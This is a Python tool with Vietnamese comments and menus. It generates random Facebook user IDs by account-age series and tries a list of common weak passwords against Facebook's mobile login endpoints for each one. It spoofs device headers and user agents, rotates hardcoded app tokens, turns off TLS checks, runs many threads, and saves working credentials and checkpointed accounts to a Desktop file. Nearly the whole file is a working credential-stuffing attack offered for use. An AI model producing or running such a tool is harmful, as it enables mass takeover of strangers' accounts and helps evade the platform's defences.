#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import time
import uuid
import random
import requests
import webbrowser
import subprocess
import threading
import urllib3
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime

# [FIX] LẤY GRADIENT TỪ ins.py
def rgb_to_ansi(r, g, b):
    return f"\033[38;2;{r};{g};{b}m"

def gradient_3(text):
    start = (0, 255, 0)
    end = (0, 128, 255)
    result = ""
    for i, char in enumerate(text):
        t = i / (len(text) - 1 if len(text) > 1 else 1)
        r = int(start[0] + (end[0] - start[0]) * t)
        g = int(start[1] + (end[1] - start[1]) * t)
        b = int(start[2] + (end[2] - start[2]) * t)
        result += rgb_to_ansi(r, g, b) + char
    return result + "\033[0m"

def gradient_2(text):
    start_color = (255, 87, 34)
    mid_color = (255, 20, 147)
    end_color = (255, 255, 0)
    steps = len(text)
    result = ""
    for i, char in enumerate(text):
        t = i / (steps - 1 if steps > 1 else 1)
        if t < 0.5:
            t2 = t / 0.5
            r = int(start_color[0] + (mid_color[0] - start_color[0]) * t2)
            g = int(start_color[1] + (mid_color[1] - start_color[1]) * t2)
            b = int(start_color[2] + (mid_color[2] - start_color[2]) * t2)
        else:
            t2 = (t - 0.5) / 0.5
            r = int(mid_color[0] + (end_color[0] - mid_color[0]) * t2)
            g = int(mid_color[1] + (end_color[1] - mid_color[1]) * t2)
            b = int(mid_color[2] + (end_color[2] - mid_color[2]) * t2)
        result += rgb_to_ansi(r, g, b) + char
    return result + "\033[0m"

# [FIX] BANNER MỚI - LẤY TỪ ins.py
BANNER_TEXT = r"""
      ,--.'|                       ___                                         ,--.'|        
   ,--,  : |                     ,--.'|_                           ,---.   ,--,:  : |        
,---.'|  : '                     |  | :,'   ,---.    __  ,-.      /__./|,`--.'`|  ' :        
|   | : _' |                     :  : ' :  '   ,'\ ,' ,'/ /| ,---.;  ; ||   :  :  | |        
:   : |.'  |   ,---.     ,---. .;__,'  /  /   /   |'  | |' |/___/ \  | |:   |   \ | :        
|   ' '  ; :  /     \   /     \|  |    |  .   ; ,. :|  |  ,'\   ;  \ ' ||   : '  '; |        
'   |  .'. | /    /  | /    / ':__,'| :  '   | |: :'  :  /   \   \  \: |'   ' ;.   ;        
|   | :  | '.    ' / |.    ' /   '  : |__'   | .; :|  | '     ;   \  ' .|   | | \  |        
'   : |  : ;'    ;  /|'    ; :__ |  | '.'|   :    |;  : |      \   \   ''   : |  ; .'        
|   | '  ,/ '    |  / |'    | '.'| ;  :    ;\   \  / |  , ;       \   `  ;|   | '`--'          
;   : ;--'  |    :  | |    :    | |  ,    /  `----'   ---'         :   \ |'   : |              
|   ,/       \   \  /  \   \  /   ---`-'                            '---" ;   |.'              
'---'         `----'    `----'                                            '---'              
"""

INFO_TEXT = f"""
    ═══════════════════════════════════════════════════════════════════
    [+] Chuc nang : Scan UID Facebook + Check Account
    ═══════════════════════════════════════════════════════════════════
"""

# [FIX] CÁC BIẾN MÀU CŨ - GIỮ LẠI ĐỂ TƯƠNG THÍCH
RED = '\x1b[38;5;196m'
GREEN = '\x1b[38;5;46m'
YELLOW = '\x1b[38;5;220m'
WHITE = '\x1b[1;37m'
CYAN = '\x1b[38;5;51m'
MAGENTA = '\x1b[38;5;201m'
RESET = '\x1b[0m'

TIMEOUT = 10

# [FIX] FIX PATH CHO PC
import platform
SYSTEM = platform.system()
if SYSTEM == 'Windows':
    OUTPUT_FILE = os.path.join(os.environ['USERPROFILE'], 'Desktop', 'scanvia_huypc.txt')
elif SYSTEM == 'Darwin':
    OUTPUT_FILE = os.path.join(os.environ['HOME'], 'Desktop', 'scanvia_huypc.txt')
else:
    OUTPUT_FILE = os.path.join(os.environ['HOME'], 'scanvia_huypc.txt')

PROXY_LIST = None

WEAK_PASSWORDS = [
    '123456', '1234567', '12345678', '123456789', '1234567890',
    '123123', '111111', '222222', '333333', '000000',
    'password', 'qwerty', 'abc123', '112233', '654321',
    '6677150', 'anhyeuem', '123321', '11111111', '00000000'
]

UA_LIST = [
    "Mozilla/5.0 (Linux; Android 14; Pixel 7 Build/UQ1A.240205.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/121.0.6167.164 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/450.0.0.44.109;]",
    "Mozilla/5.0 (Linux; Android 13; SM-G998B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/425.0.0.33.102;]",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 12; SM-A525F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/400.0.0.22.100;]",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:110.0) Gecko/20100101 Firefox/110.0"
]

TOKENS = [
    "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
    "6628568379|c1e620fa708a1d5696fb990c466eaa64",
    "124024574287414|bcb6d3a1d2e5e5e5e5e5e5e5e5e5e5",
]

# [FIX] XOÁ HẲN 2 HÀM: open_link() VÀ require_subscription()

def get_headers():
    return {
        'User-Agent': random.choice(UA_LIST),
        'Accept': 'application/json',
        'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
        'X-FB-Connection-Type': 'WIFI',
        'X-FB-Net-HNI': str(random.randint(40000, 50000)),
        'X-FB-SIM-HNI': str(random.randint(40000, 50000)),
        'X-FB-Connection-Quality': 'EXCELLENT',
        'X-FB-HTTP-Engine': 'Liger',
        'Content-Type': 'application/x-www-form-urlencoded',
    }

def get_proxy():
    if PROXY_LIST:
        return {'http': random.choice(PROXY_LIST), 'https': random.choice(PROXY_LIST)}
    return None

def guess_year(uid):
    uid = str(uid)
    if uid.startswith('100000'):
        return random.choice(['2009', '2010'])
    elif uid.startswith('100001'):
        return '2010'
    elif uid.startswith('100002') or uid.startswith('100003'):
        return '2011'
    elif uid.startswith('100004'):
        return '2012'
    elif uid.startswith(('100005', '100006')):
        return '2013'
    elif uid.startswith(('100007', '100008')):
        return '2014'
    elif uid.startswith('100009'):
        return '2015'
    elif uid.startswith('6155'):
        return '2020+'
    else:
        try:
            uid_int = int(uid)
            if uid_int < 1000000:
                return "2004-2005"
            elif uid_int < 50000000:
                return "2006-2007"
            else:
                return "2008-2009"
        except:
            return 'Unknown'

def generate_uid(series=None):
    if series == '2009-2010':
        return '10000' + ''.join(random.choices('0123456789', k=10))
    elif series == '2011-2012':
        return '10000' + random.choice(['2', '3', '4']) + ''.join(random.choices('0123456789', k=8))
    elif series == '2013-2014':
        return '10000' + random.choice(['5', '6', '7', '8']) + ''.join(random.choices('0123456789', k=8))
    elif series == '2015':
        return '100009' + ''.join(random.choices('0123456789', k=8))
    elif series == 'old':
        return str(random.randint(1000, 999999999))
    else:
        return '10000' + random.choice('123456789') + ''.join(random.choices('0123456789', k=8))

def login_api_v1(uid, pwd, token):
    session = requests.Session()
    try:
        data = {
            'adid': str(uuid.uuid4()),
            'format': 'json',
            'device_id': str(uuid.uuid4()),
            'cpl': 'true',
            'family_device_id': str(uuid.uuid4()),
            'credentials_type': 'device_based_login_password',
            'error_detail_type': 'button_with_disabled',
            'source': 'device_based_login',
            'email': uid,
            'password': pwd,
            'access_token': token,
            'generate_session_cookies': '1',
            'meta_inf_fbmeta': '',
            'advertiser_id': str(uuid.uuid4()),
            'currently_logged_in_userid': '0',
            'locale': 'en_US',
            'client_country_code': 'US',
            'method': 'auth.login',
            'fb_api_req_friendly_name': 'authenticate',
            'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
            'api_key': '882a8490361da98702bf97a021ddc14d'
        }
        response = session.post(
            'https://b-graph.facebook.com/auth/login',
            data=data,
            headers=get_headers(),
            proxies=get_proxy(),
            timeout=TIMEOUT,
            verify=False
        )
        return response.json()
    except Exception as e:
        return {'error': str(e)}

def login_api_v2(uid, pwd, token):
    try:
        url = f"https://b-api.facebook.com/method/auth.login?format=json&email={uid}&password={pwd}&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&locale=en_US&client_country_code=US&access_token={token}&fb_api_req_friendly_name=authenticate&cpl=true"
        response = requests.get(
            url,
            headers=get_headers(),
            proxies=get_proxy(),
            timeout=TIMEOUT,
            verify=False
        )
        return response.json()
    except Exception as e:
        return {'error': str(e)}

found_accounts = 0
total_scanned = 0
scan_lock = threading.Lock()

def process_response(uid, pwd, response):
    global found_accounts
    if 'session_key' in response or 'access_token' in response:
        year = guess_year(uid)
        with scan_lock:
            found_accounts += 1
        print(f"\n{GREEN}✅ {uid} | {pwd} | {year}{RESET}")
        with open(OUTPUT_FILE, 'a') as f:
            f.write(f"{uid}|{pwd}|{year}\n")
        return True
    elif 'www.facebook.com' in str(response) or 'checkpoint' in str(response).lower():
        year = guess_year(uid)
        print(f"\n{YELLOW}[CP] {uid} | {pwd} | {year}{RESET}")
        with open(OUTPUT_FILE.replace('.txt', '-CP.txt'), 'a') as f:
            f.write(f"{uid}|{pwd}|{year}\n")
        return False
    return False

def worker(uid, method='v1'):
    global total_scanned
    token = random.choice(TOKENS)
    for pwd in WEAK_PASSWORDS:
        if method == 'v1':
            resp = login_api_v1(uid, pwd, token)
        else:
            resp = login_api_v2(uid, pwd, token)
        if process_response(uid, pwd, resp):
            return True
        time.sleep(0.05)
    with scan_lock:
        total_scanned += 1
    sys.stdout.write(f"\r{WHITE}[*] Da scan: {CYAN}{total_scanned}{WHITE} | Tim duoc: {GREEN}{found_accounts}{RESET}")
    sys.stdout.flush()
    return False

def banner():
    os.system('cls' if SYSTEM == 'Windows' else 'clear')
    print(gradient_3(BANNER_TEXT))
    print(gradient_2(INFO_TEXT))

def main_menu():
    banner()
    print(f"""
{YELLOW}[1]{RESET} Scan 2009-2010
{YELLOW}[2]{RESET} Scan 2011-2012
{YELLOW}[3]{RESET} Scan 2013-2014
{YELLOW}[4]{RESET} Scan 2015
{YELLOW}[5]{RESET} Scan ID Sieu Co (2004-2009)
{YELLOW}[6]{RESET} Scan Random All
{YELLOW}[0]{RESET} Thoat
""")
    choice = input(f"{WHITE}[?] Chon chuc nang: {RESET}").strip()

    series_map = {
        '1': '2009-2010',
        '2': '2011-2012',
        '3': '2013-2014',
        '4': '2015',
        '5': 'old',
        '6': 'all',
    }

    if choice in series_map:
        total = int(input(f"{YELLOW}[?] So luong ID muon scan: {RESET}"))
        threads = int(input(f"{YELLOW}[?] So luong (khuyen 20-50): {RESET}") or 30)
        method_choice = input(f"{YELLOW}[?] Method (v1/v2, mac dinh v1): {RESET}").strip().lower() or 'v1'
        
        print(f"\n{GREEN}[+] Dang tao {total} ID...{RESET}")
        uid_list = [generate_uid(series_map[choice]) for _ in range(total)]
        
        print(f"{GREEN}[+] Bat dau scan voi {threads} luong...{RESET}\n")
        
        with ThreadPoolExecutor(max_workers=threads) as executor:
            executor.map(lambda uid: worker(uid, method_choice), uid_list)
        
        input(f"\n{MAGENTA}[✓] Hoan thanh! Nhan Enter de tiep tuc...{RESET}")
        main_menu()
        
    elif choice == '0':
        print(f"{GREEN}[+] Cam on da su dung! Ket qua luu tai {OUTPUT_FILE}{RESET}")
        sys.exit(0)
    else:
        print(f"{RED}[!] Lua chon khong hop le!{RESET}")
        time.sleep(1)
        main_menu()

if __name__ == '__main__':
    import shutil
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    
    output_dir = os.path.dirname(OUTPUT_FILE)
    if output_dir and not os.path.exists(output_dir):
        os.makedirs(output_dir, exist_ok=True)
    
    # [FIX] BỎ HẲN require_subscription()
    main_menu()